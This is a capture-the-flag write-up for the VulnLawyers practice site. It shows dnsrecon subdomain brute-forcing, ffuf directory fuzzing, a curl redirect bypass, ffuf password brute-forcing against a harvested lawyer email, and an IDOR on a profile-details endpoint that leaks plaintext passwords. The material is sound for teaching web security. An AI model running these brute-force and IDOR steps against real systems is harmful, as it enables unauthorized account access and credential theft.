Well, I've got them, but for a price...\nNamely a little bit of your time and attention:\n\n**Please try the challenges yourself before checking the answers.**\n\nCTF's are notoriously 'NP' prone. Once you've seen the answer, it's easy\nto think you could've come up with that. There is nothing wrong with looking up\nanswers, but try reflect on why you couldn't figure it out. I try to explain my\nthought process as best and brief as possible, but figuring it out yourself is\njust the best feeling, so please give it another go when you're reading this!\nI'll not include any of the flags to avoid people simply copying and pasting\nthem.\n\nAnother note, I create these writeups as if speaking to myself. If my manner of\nspeaking seems a bit odd, you try talking to yourself without sounding\na little odd.\n\n## Flags\n\n### Data Baby (Enumeration)\n\nThe first flag can be found by performing a standard recon of the subdomains of\n`vulnlawyers.co.uk`.\n```\n$ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt\n\n[*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)\n[*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...\n[+] \tA data.vulnlawyers.co.uk 68.183.255.206\n[+] \tA www.vulnlawyers.co.uk 68.183.255.206\n[+] 2 Records Found\n```\n\nDoing a http request with `curl`, or opening the domain in your browser returns\nsome info about the API and the first flag.\n```\n$ curl http://data.vulnlawyers.co.uk -H \"Cookie: <your_ctf_cookie>\"\n\n{\"name\":\"VulnLawyers Website API\",\"version\":\"2.1.04\",\"flag\":\"[^FLAG^1337-DIY-1337^FLAG^]\"}\n```\n\n### Browsers are Evil (Enumeration)\n\nNow that we know the different domains that are available to us, let's do some\nrecon on the different files and folders we have access to.\n```\n$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://www.vulnlawyers.co.uk/FUZZ\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\n\ncss                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\ndenied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]\nimages                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\njs                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]\nlogin                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]\n```\n\nSince we are (always) looking to escalate privileges, the `login` endpoint looks\nespecially interesting. Entering `http://www.vulnlawyers.co.uk/login` in your\nbrowser will lead to a page that says **Acess is denied from your IP address**.\nShit. But take a look at where we are `http://www.vulnlawyers.co.uk/denied`,\nwe've been rerouted. \n\nLet's take a look at what happens with our request in the browser by opening the\ndeveloper tab (often <kbd>F12</kbd>, but if you didn't know that, you might want\nto look into some other challenges). Opening the 'Network' tab (on\nFirefox, might be different on Chrome, Safari, etc.) shows that we got a `302`\ncode from the `/login` endpoint. This code specifically tells a *browser* to\nreroute to a URL given by the `Location` header [^1].\n\nBrowsers can do weird stuff, so let's try to ask `curl` what's up.\n```\n$ curl www.vulnlawyers.co.uk/login -H \"Cookie: ctfchallenge=<your_ctf_cookie>\"\n\n[...]\n  <div class=\"alert alert-info\">\n      <p>Access to this portal can now be found here <a href=/lawyers-only\">/lawyers-only</a></p>\n      <p>[^FLAG^TRY_ME_B*TCH^FLAG^]</p>\n  </div>\n[...]\n```\nWell, would you look at that, a flag and a hidden endpoint :eyes:! Christmas\ncame early this year.\n\nOpening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring us to a\nlogin screen. Now we can start gaining some unrequisited privileges.\n\n### Pipelining (Enumeration)\n\nThe current goal is to log in, but we lack any user data. Thinking back, the\n`data.vulnlawyers.co.uk` probably contains some of that precious user data.\nActually, we have yet to enumerate files and folders. Not you tho, no, while we\nwere trying to figure out how to access the login page, you have of course\nstarted `ffuf`'ing (that's not a word, but it should be) the domain. If you\nhaven't, keep in mind that reconnaissance can sometimes take a long time.\nMinimize waiting and keep that noggin of yours churning.\n\n```\n$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://data.vulnlawyers.co.uk/FUZZ\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\nusers                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]\n```\n\n'Lo and behold, an endpoint called `/users`. Let's employ `curl` and see what it\nholds.\n```\ncurl data.vulnlawyers.co.uk/users -H \"Cooki e: ctfchallenge=<your_ctf_cookie>\"\n{\n  \"users\": [\n    {\n      \"name\": \"Yusef Mcclain\",\n      \"email\": \"yusef.mcclain@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Shayne Cairns\",\n      \"email\": \"shayne.cairns@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Eisa Evans\",\n      \"email\": \"eisa.evans@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Jaskaran Lowe\",\n      \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Marsha Blankenship\",\n      \"email\": \"marsha.blankenship@vulnlawyers.co.uk\"\n    }\n  ],\n  \"flag\": \"[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]\"\n}\n```\n\nAnd that's our third flag. Onto exploitation!\n\n### Higher and Higher (Exploitation)\n\nWith a bit of luck, the attorneys are not technically inclined and use simple\npasswords. After a bit of trail-and-error, we stumble upon Jaskaran Lowe.\n\n```\nffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=<your_ctf_cookie>\" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H \"Content-Type: applicati\non/x-www-form-urlencoded\" -d 'email=jaskaran.lowe@vulnlawyers.co.uk&password=FUZZ' -fr \"Invalid\"\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\n\nsummer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]\n```\n\nLogging in using browser gives us some info regarding a case, but more\nimportantly, the next flag!\n\n### Some More Digging (Exploitation)\n\nWe got a whole new section of the site to explore! Now, it might be worth doing\nsome more fuzzing on the path since we've actually been redirected to\n`.../lawyers-only-login` from `.../lawyers-only`, and opening the **Profile\ntab** shows the path `.../lawyers-only-profile`. Thus, we run `ffuf [...]\nhttp://www.vulnlawyers.co.uk/lawyers-only-FUZZ` while further exploring the new\ndomain. Spoiler alert: no interesting results, but good habit nonetheless.\n\nLooking at the **Portal** page shows a list of current cases. There is a single\ncase which is managed by *Shayne Cairns*, who is also the only one who can\nperform actions on it. New goal: gain access to their account. Opening the\nsource code of the shows nothing interesting.\n\nTaking a closer look at the **Profile** page shows us a place where we can\nupdate our user data! Immediate thought: could we somehow use this to update\nanother user's profile info? Let's take a look at the request payload using the\n**Network** tab in the dev tools.\n\n```\nname=Jaskaran+Lowe&email=jaskaran.lowe%40vulnlawyers.co.uk\n```\n\nHmm, doesn't seem like it. This leads to finding more info in the request,\nlike a new cookie called `token`. Makes sense, these requests have to be\nauthenticated, we should include this in any requests we do via the terminal.\nOtherwise, nothing seems unusual.\n\nPerhaps we can find something interesting in the source code. Let's use `curl`\nto retrieve the data.\n```\n$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n<script>\n    $.getJSON('/lawyers-only-profile-details/4',function(resp){\n        $('input[name=\"email\"]').val( resp.email );\n        $('input[name=\"name\"]').val( resp.name );\n    });\n</script>\n```\n\nOh would you look at that :sunglasses:! That's how our info was already filled in!\nFor some reason they use some other source than the\n`data.vulnlawyers.co.uk/users` endpoint which we've seen before. Maybe this\ncontains different information.\n```\n$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n{\n  \"id\": 4,\n  \"name\": \"Jaskaran Lowe\",\n  \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\",\n  \"password\": \"summer\"\n}\n```\n\nOh yes. Plain old passwords. Of course, they should have used the\n`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let's access\n*Shayne Cairns* profile details with the user `id` which we can find at\n`data.vulnlawyers.co.uk/users`. Small note: that id was zero-indexed (Jaskaran's\n`id` here is `4` while it was `3` before), this one isn't. Compensating for that\ngives the following request.\n```\n$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H \"Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>\"\n\n{\n  \"id\": 2,\n  \"name\": \"Shayne Cairns\",\n  \"email\": \"shayne.cairns@vulnlawyers.co.uk\",\n  \"password\": \"w&#2a1^3p\",\n  \"flag\": \"[^FLAG^NA_AH^FLAG^]\"\n}\n```\nFlag number five!\n\n### Finishing Up (Exploitation)\n\nThis leaves us to the last flag. We now use the found credentials to log in as\nShayne Cairns, delete the case, and find the last flag :trophy:.\n\n[^1]: [302 Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)\n"},"__N_SSG":true}
